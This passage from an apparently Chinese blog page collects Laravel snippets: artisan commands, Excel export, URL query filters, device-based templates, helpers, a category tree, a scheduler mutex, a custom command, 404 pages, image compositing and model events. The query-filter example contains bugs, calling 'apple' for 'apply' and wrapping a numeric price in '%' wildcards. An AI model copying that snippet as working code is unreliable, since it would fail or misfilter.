class="line">php artisan session:table</span><br><span class="line">// 创建 "public/storage" 到 "storage/app/public" 的软链接</span><br><span class="line">php artisan storage:link</span><br><span class="line"></span><br><span class="line">// 从 vendor 的扩展包中发布任何可发布的资源</span><br><span class="line">// --force        重写所有已存在的文件</span><br><span class="line">// --provider     指定你想要发布资源文件的服务提供者</span><br><span class="line">// --tag          指定你想要发布标记资源.</span><br><span class="line">php artisan vendor:publish [--force] [--provider[="..."]] [--tag[="..."]]</span><br><span class="line">php artisan tail [--path[="..."]] [--lines[="..."]] [connection]</span><br><span class="line"></span><br><span class="line">// 缓存视图文件以提高效率</span><br><span class="line">php artisan view:cache</span><br><span class="line">// 清除视图文件缓存</span><br><span class="line">php artisan view:clear</span><br><span class="line"></span><br><span class="line">https://laravelcode.cn/docs/5.8</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-Excel"><a href="#Laravel-Excel" class="headerlink" title="Laravel Excel"></a>Laravel Excel</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> maatwebsite/excel</span><br><span class="line">php artisan vendor:publish --provider=<span class="string">"Maatwebsite\Excel\ExcelServiceProvider"</span></span><br><span class="line"></span><br><span class="line">php artisan make:<span class="keyword">export</span> UsersExport --model=User</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Exports;</span><br><span class="line"></span><br><span class="line">use App\User;</span><br><span class="line">use Maatwebsite\Excel\Concerns\FromCollection;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UsersExport</span> <span class="title">implements</span> <span class="title">FromCollection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">collection</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> User::all();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">控制器中调用</span><br><span class="line"></span><br><span class="line">use App\Exports\UsersExport;</span><br><span class="line">use Maatwebsite\Excel\Facades\Excel;</span><br><span class="line">use App\Http\Controllers\Controller;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UsersController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">export</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Excel::download(<span class="keyword">new</span> UsersExport, <span class="string">'users.xlsx'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/29089</span></span><br></pre></td></tr></table></figure>
<h3 id="模型过滤"><a href="#模型过滤" class="headerlink" title="模型过滤"></a>模型过滤</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Book::query()</span><br><span class="line">        -&gt;where(<span class="string">'title'</span>, <span class="string">'like'</span>, <span class="string">'%我们%'</span>)</span><br><span class="line">        -&gt;where(<span class="string">'price'</span>, <span class="string">'&gt;='</span>, <span class="number">30</span>)</span><br><span class="line">        -&gt;where(<span class="string">'publisher'</span>, <span class="string">'大地出版社'</span>)</span><br><span class="line">        -&gt;orderBy(<span class="string">'id'</span>, <span class="string">'DESC'</span>)</span><br><span class="line">        -&gt;get();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abstract <span class="class"><span class="keyword">class</span> <span class="title">QueryFilter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    protected $request;</span><br><span class="line">    protected $builder;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Request $request</span>)                                                                        </span></span><br><span class="line"><span class="function">    </span>&#123;                                                                                                                    </span><br><span class="line">        $<span class="keyword">this</span>-&gt;request = $request;                                                                                       </span><br><span class="line">    &#125;                                                                                                                    </span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">apply</span>(<span class="params">Builder $builder</span>)                                                                              </span></span><br><span class="line"><span class="function">    </span>&#123;                                                                                                                    </span><br><span class="line">        $<span class="keyword">this</span>-&gt;builder = $builder;                                                                                       </span><br><span class="line"></span><br><span class="line">        foreach ($<span class="keyword">this</span>-&gt;filters() <span class="keyword">as</span> $name =&gt; $value) &#123;                                                                  </span><br><span class="line">            <span class="keyword">if</span> (method_exists($<span class="keyword">this</span>, $name)) &#123;                                                                           </span><br><span class="line">                call_user_func_array([$<span class="keyword">this</span>, $name], array_filter([$value]));                                            </span><br><span class="line">        &#125;                                                                                                            </span><br><span class="line">     &#125;                                                                                                                </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;builder;                                                                                           </span><br><span class="line">    &#125;                                                                                                                    </span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">filters</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;request-&gt;all();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookFilter</span> <span class="keyword">extends</span> <span class="title">QueryFilter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">title</span>(<span class="params">$title</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;builder-&gt;where(<span class="string">'title'</span>, <span class="string">'like'</span>, <span class="string">"%&#123;$title&#125;%"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">price</span>(<span class="params">$price</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;builder-&gt;where(<span class="string">'price'</span>, <span class="string">'&gt;='</span>, <span class="string">"%&#123;$price&#125;%"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">publisher</span>(<span class="params">$publisher</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;builder-&gt;where(<span class="string">'publisher'</span>, $publisher);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">通过 URL 的参数来进行动态查询。</span><br><span class="line"></span><br><span class="line">books?title=我们    <span class="comment">//  查找标题含有我们的图书</span></span><br><span class="line"></span><br><span class="line">books?title=我们&amp;price=<span class="number">25</span>   <span class="comment">//  查找标题含有我们并且价格大于25元的图书</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">scopeFilter</span>(<span class="params">$query, QueryFilter $filters</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $filters-&gt;apple($query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">最后，我们原来控制器的方法将改为下面的样子：</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">BookFilter $filters</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Book::filter($filters)-&gt;get();</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/29100#reply91762</span></span><br></pre></td></tr></table></figure>
<h3 id="Laravel-配置双模板"><a href="#Laravel-配置双模板" class="headerlink" title="Laravel 配置双模板"></a>Laravel 配置双模板</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> whichbrowser/parser</span><br><span class="line">php artisan make:middleware Template</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $except = [];</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">$request, Closure $next</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = <span class="keyword">new</span> WhichBrowser\Parser(getallheaders());</span><br><span class="line">        <span class="comment">// 如果是桌面类型, 返回true</span></span><br><span class="line">        $isDesktop = $result-&gt;isType(<span class="string">'desktop'</span>);</span><br><span class="line">        <span class="keyword">if</span> ($isDesktop) &#123;</span><br><span class="line">            <span class="comment">// 加载pc端的模板文件</span></span><br><span class="line">            $path = resource_path(<span class="string">'views/pc/'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 加载mobile端的模板文件</span></span><br><span class="line">            $path = resource_path(<span class="string">'views/mobile/'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取视图查找器实例</span></span><br><span class="line">        $view = app(<span class="string">'view'</span>)-&gt;getFinder();</span><br><span class="line">        <span class="comment">// 重新定义视图目录</span></span><br><span class="line">        $view-&gt;prependLocation($path);</span><br><span class="line">        <span class="comment">// 返回请求</span></span><br><span class="line">        <span class="keyword">return</span> $next($request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">protected $middleware = [</span><br><span class="line">    \App\Http\Middleware\Template::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">return</span> view(<span class="string">'registration.index'</span>, $data);</span><br><span class="line">如从 PC 设备打开网页：加载 /resources/views/pc/registration/index.blade.php 模板</span><br><span class="line"></span><br><span class="line">如从移动设备打开网页：加载 /resources/views/mobile/registration/index.blade.php 模板</span><br><span class="line">https:<span class="comment">//learnku.com/articles/24789</span></span><br></pre></td></tr></table></figure>
<h3 id="助手函数"><a href="#助手函数" class="headerlink" title="助手函数"></a>助手函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:provider HelperServiceProvider</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    foreach(glob(app_path(<span class="string">'Helpers'</span>) . <span class="string">'/*.php'</span>) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        require_once $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">App\Providers\HelperServiceProvider::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line"><span class="class"><span class="title">function</span> <span class="title">carbon</span>($<span class="title">time</span> </span>= <span class="literal">null</span>, $tz = <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> \Carbon\Carbon($time, $tz);</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//blog.foof.dev/posts/laravel-elegant-add-helper-function-0</span></span><br></pre></td></tr></table></figure>
<h3 id="创建无限极分类树"><a href="#创建无限极分类树" class="headerlink" title="创建无限极分类树"></a>创建无限极分类树</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getList</span>(<span class="params">$catList</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $treeData = [];</span><br><span class="line">    foreach ($catList <span class="keyword">as</span> &amp;$item) &#123;</span><br><span class="line">        $parent_id = $item[<span class="string">'parent_id'</span>];</span><br><span class="line">        <span class="keyword">if</span> (isset($catList[$parent_id]) &amp;&amp; !empty($catList[$parent_id])) &#123;</span><br><span class="line">            $catList[$parent_id][<span class="string">'list'</span>][] = &amp;$catList[$item[<span class="string">'id'</span>]];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $treeData[] = &amp;$catList[$item[<span class="string">'id'</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unset($item);</span><br><span class="line">    <span class="keyword">return</span> $treeData[<span class="number">0</span>][<span class="string">'list'</span>]; <span class="comment">// 根节点只有中华人民共和国，所以直接返回中国的所有子节点</span></span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30088</span></span><br></pre></td></tr></table></figure>
<h3 id="任务重复执行"><a href="#任务重复执行" class="headerlink" title="任务重复执行"></a>任务重复执行</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">当前任务还没有执行完毕的时候另一个相同的任务也会执行，从而导致任务重复。例如想象一下我们执行每分钟生成一次报告的任务，在经过一段时间后，数据量变得很大导致执行时间多于 <span class="number">1</span> 分钟，这样就会导致在上一个任务还没结束的时候另一个相同的任务开始执行</span><br><span class="line"></span><br><span class="line">当我们在开会进行激烈的讨论时，我会从我桌子里拿出来一个尖叫鸡。只有手里拿着尖叫鸡的人才能说话，如果你没有拿着尖叫鸡你是不能说话的。你只能向会议主持人请示，只有在你拿到尖叫鸡的时候你才能说话否则只能等待。当你讲话完毕的时候，将尖叫鸡还给会议主持人，主持人会将尖叫鸡给到下一个人来让其说话。这样会确保人们不会互相交谈，同时他们也会有自己的时间来进行讲话。</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params">Event $event</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;cache-&gt;add($event-&gt;mutexName(), <span class="literal">true</span>, <span class="number">1440</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">exists</span>(<span class="params">Event $event</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;cache-&gt;has($event-&gt;mutexName());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">forget</span>(<span class="params">Event $event</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $<span class="keyword">this</span>-&gt;cache-&gt;forget($event-&gt;mutexName());</span><br><span class="line">&#125;</span><br><span class="line">register_shutdown_function(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    $<span class="keyword">this</span>-&gt;removeMutex();</span><br><span class="line">&#125;);</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30550</span></span><br></pre></td></tr></table></figure>
<h3 id="创建一个命令"><a href="#创建一个命令" class="headerlink" title="创建一个命令"></a>创建一个命令</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan make:command HashCommand</span><br><span class="line">$signature 属性，设置命令名、命令参数、命令选项；</span><br><span class="line">$description 属性，设置命令的描述信息；</span><br><span class="line">handle() 方法，包含实际的命令逻辑代码。</span><br><span class="line">修改 $signature 属性，设置 hash 命令的命令名、命令参数、命令选项：</span><br><span class="line"></span><br><span class="line">protected $signature = <span class="string">'hash &#123;text&#125; &#123;--U|uppercase&#125;'</span>;</span><br><span class="line">  public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = $<span class="keyword">this</span>-&gt;argument(<span class="string">'text'</span>);</span><br><span class="line">        $uppercase = $<span class="keyword">this</span>-&gt;option(<span class="string">'uppercase'</span>);</span><br><span class="line"></span><br><span class="line">        $md5text = $uppercase ? strtoupper(md5($text)) : md5($text);</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;info(<span class="string">"md5('&#123;$text&#125;') = $md5text"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">$ php artisan hash <span class="string">"hello world"</span></span><br><span class="line">md5(<span class="string">'hello world'</span>) = <span class="number">5</span>eb63bbbe01eeed093cb22bb8f5acdc3</span><br><span class="line">带上 -U 选项：</span><br><span class="line"></span><br><span class="line">$ php artisan hash <span class="string">"hello world"</span> -U</span><br><span class="line">md5(<span class="string">'hello world'</span>) = <span class="number">5</span>EB63BBBE01EEED093CB22BB8F5ACDC3</span><br></pre></td></tr></table></figure>
<h3 id="自定义-Laravel-的-404-页面"><a href="#自定义-Laravel-的-404-页面" class="headerlink" title="自定义 Laravel 的 404 页面"></a>自定义 Laravel 的 404 页面</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">app/Exceptions/Handler.php 文件中修改 render 方法</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">$request, Exception $exception</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;isHttpException($exception)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($exception-&gt;getStatusCode() == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> response()-&gt;view(<span class="string">'errors.'</span> . <span class="string">'404'</span>, [], <span class="number">404</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> parent::render($request, $exception);</span><br><span class="line">&#125;创建一个新的视图 errors/<span class="number">404.</span>blade.php 。</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">$request, Exception $exception</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;isHttpException($exception)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (view()-&gt;exists(<span class="string">'errors.'</span> . $exception-&gt;getStatusCode())) &#123;</span><br><span class="line">            <span class="keyword">return</span> response()-&gt;view(<span class="string">'errors.'</span> . $exception-&gt;getStatusCode(), [], $exception-&gt;getStatusCode());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> parent::render($request, $exception);</span><br><span class="line">&#125;</span><br><span class="line">创建一个 自定义异常 。运行以下代码来创建一个名为 TestingHttpException 的异常。</span><br><span class="line"></span><br><span class="line">php artisan make:exception TestingHttpException</span><br><span class="line">在  app/Exceptions/Handler.php  文件中，修改 render 方法。</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">$request, Exception $exception</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($exception <span class="keyword">instanceof</span> TestingHttpException) &#123;</span><br><span class="line">        <span class="keyword">return</span> response()-&gt;view(<span class="string">'errors.testing'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> parent::render($request, $exception);</span><br><span class="line">&#125;</span><br><span class="line">如果异常是 TestingHttpException 的实例，它将返回 errors.testing 视图。https:<span class="comment">//learnku.com/laravel/t/27873</span></span><br></pre></td></tr></table></figure>
<h3 id="图片处理"><a href="#图片处理" class="headerlink" title="图片处理"></a>图片处理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> intervention/image  https:<span class="comment">//learnku.com/laravel/t/30978</span></span><br><span class="line"> <span class="comment">// 创建一张空的画布，像素3628x1757，背景白色</span></span><br><span class="line">   $img = Image::canvas(<span class="number">3628</span>, <span class="number">1757</span>, <span class="string">'#fff'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取本地图片，可以获取input上传文件</span></span><br><span class="line">     $leftImage = Image::make(base_path().<span class="string">'/public/p.jpg'</span>)-&gt;resize(<span class="number">2255</span>, <span class="number">1305</span>);</span><br><span class="line">     $rightImage = Image::make(base_path().<span class="string">'/public/f.jpg'</span>)-&gt;resize(<span class="number">1000</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入到画布，left-top是距离左侧和顶部，值对应的是后面 100 100 处</span></span><br><span class="line">     $img-&gt;insert($leftImage, <span class="string">'left-top'</span>, <span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line">     $img-&gt;insert($rightImage, <span class="string">'right-top'</span>, <span class="number">100</span>, <span class="number">250</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入文本，通过回调设置参数，file上传的是字体库，需要自己下载放入</span></span><br><span class="line">     $img-&gt;text(<span class="string">'王*军       320830**********542'</span>, <span class="number">1757</span>, <span class="number">1550</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$font</span>) </span>&#123;</span><br><span class="line">        $font-&gt;file(base_path().<span class="string">'/public/fzjw.ttf'</span>);</span><br><span class="line">        $font-&gt;size(<span class="number">160</span>);</span><br><span class="line">        $font-&gt;color(<span class="string">'#000'</span>);</span><br><span class="line">        $font-&gt;align(<span class="string">'center'</span>);</span><br><span class="line">        $font-&gt;valign(<span class="string">'top'</span>);</span><br><span class="line">        $font-&gt;angle(<span class="number">0</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//可以直接返回图像，也可通过$img-&gt;save()进行保存图片</span></span><br><span class="line">    <span class="keyword">return</span> $img-&gt;response(<span class="string">'jpg'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="取消事件触发"><a href="#取消事件触发" class="headerlink" title="取消事件触发"></a>取消事件触发</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取model里面的事件</span></span><br><span class="line">$dispatcher = YourModel::getEventDispatcher();</span><br><span class="line"></span><br><span class="line"><span class="comment">//禁用model里面的事件</span></span><br><span class="line">YourModel::unsetEventDispatcher();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用model的save方法</span></span><br><span class="line">$yourInstance-&gt;save();</span><br><span class="line"></span><br><span class="line"><span class="comment">//启用事件</span></span><br><span class="line">YourModel::setEventDispatcher($dispatcher);</span><br><span class="line"><span class="comment">//Visitor model有saved事件，某些地方某些情况监听到后做一些其他操作</span></span><br><span class="line">protected $dispatchesEvents = [</span><br><span class="line">        <span class="string">'saved'</span> =&gt; VisitorSavedEvent::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">    ];</span><br><span class="line"><span class="comment">//有时候不需要触发事件，是可以取消的，可以调用model的update方法避开save()或者取消事件（推荐后者）。</span></span><br><span class="line"><span class="comment">// 获取来访信息</span></span><br><span class="line">        $visitor = 